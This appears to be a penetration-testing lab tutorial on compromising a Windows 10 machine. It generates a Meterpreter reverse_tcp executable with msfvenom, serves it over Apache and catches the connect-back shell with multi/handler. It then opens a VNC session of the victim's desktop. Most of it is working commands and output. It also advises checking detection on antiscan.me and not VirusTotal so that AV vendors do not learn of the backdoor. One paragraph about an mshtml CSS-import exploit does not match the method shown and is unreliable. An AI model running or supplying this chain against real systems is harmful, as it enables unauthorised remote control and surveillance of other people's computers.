# Exploiting Client Side Vulnerabilities and Establishing a VNC session
Attackers use client-side vulnerabilities to exploit unpatched software, thereby attaining access to the machine on which the software is installed.

VNC enables attackers to remotely access and control computers targeted from another computer or mobile device, wherever they are in the world. At the same time, it is also used by administrator and organizations throughout every industry sector for a range of different scenarios and use cases, including providing IT desktop support to colleagues and friends, and accessing systems and services on the move.

### Objectives
* How to exploit client-side vulnerabilities and establish a VNC session.

### Requisites
* Kali Linux virtual machine (Attacker).
* Windows 10 virtual machine (Target).


## Launch Metasploit Framework

Launch Kali Linux and open the Terminal window and type:

`msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.0.2.42 LPORT=444 -o /root/Desktop/Test.exe`

**Note**: LHOST is the IP address of your Kali machine.

This command will generate Test.exe, a malicious file on Desktop as shown in below:

```
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/Test.exe
```

You can also try this by using the `msfconsole`. 

To check the malicious file that you created, go to https://nodistribute.com/ or https://antiscan.me and upload the file:

![AntiScan.Me](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0e16bfcaba630b14ba1efa3ca24e061158247558/antiscan.png)


This site will perform a scan over 20 AV softwares databases. **Do not upload your backdoors or any file to virusTotal.**

## Share the malicious file on target
Now create a directory to share this file with the target machine provide the permissions and copy the file from Desktop to shared location:

Create a directory on html folder:<br>
`mkdir /var/www/html/share/`<br>

Change the mode for the share to **755**:<br>
`chmod -R 755 /var/www/html/share/`<br>

Change the ownership of that folder to **www-data**:<br>
`chown -R www-data:www-data /var/www/html/share/`

Now copy the malicious file to the shared location:<br>
`cp /root/Desktop/Test.exe /var/www/html/share/`

Next, start the apache service:<br>
`service apache2 start`


Open a new terminal window and type `msfconsole` to launch Metasploit Framework.

Use the `multi/handler` to capture the session.

![msfconsole](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3f818aa7902d7d0c864577c885b2a16c1b5caa33/msfconsole.png)

In msfconsole:
1. `use multi/handler`
2. `set payload windows/meterpreter/reverse_tcp`
3. set the `LHOST` to your Kali IP address and `LPORT` to 444
4. `run` the exploit

#### Reverse TCP
A reverse shell (also known as a connect-back) is the exact opposite: it requires the attacker to set up a listener first on his box, the target machine acts as a client connecting to that listener, and then finally the attacker receives the shell.

This module exploits memory corruption vulnerability within Microsoft's HTML engine (mshtml). When parsing an HTML page containing a recursive CSS import, a C++ object is deleted and later reused.

## On Windows machine
Remember to deactivate all Windows Defender parameters.

Launch the browser and type the IP address of the Kali machine that are running apache webserver and download the **Test.exe**. 

In my case is `http://10.0.2.42/share`

![Test.Exe](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/48fe2ec77ebde90c0febb208704e4172b60b4428/testexe.png)

Double click  **Test.exe**.<br>
You will get a Security Warning window, click **run**.

![Sec Warning](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/securityWarningWin.png)

## Meterpreter 
Switch to Kali Linux machine and check if there is any session that are opened in the Meterpreter Shell as shown below:

![meterpreter](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/meterpreter.png)

Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.

Useful commands:
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

About Meterpreter:
https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/

## Remote View in Kali Linux
Now, you can create a VNC session on Windows 10 machine remotely by typing:

`run vnc`

This command will open a VNC session of the Target's machine as shown below:

![vnc](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/78278f30571b9988b108c92defcd91134886c404/vnc.png)

Useful links:

* [Metasploit Cheat Sheet - SANS](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
* [Meterpreter Cheat Sheet](https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf)
* [Msfvenom Cheat Sheet](https://widesecurity.net/linux/msfvenom-cheat-sheet/)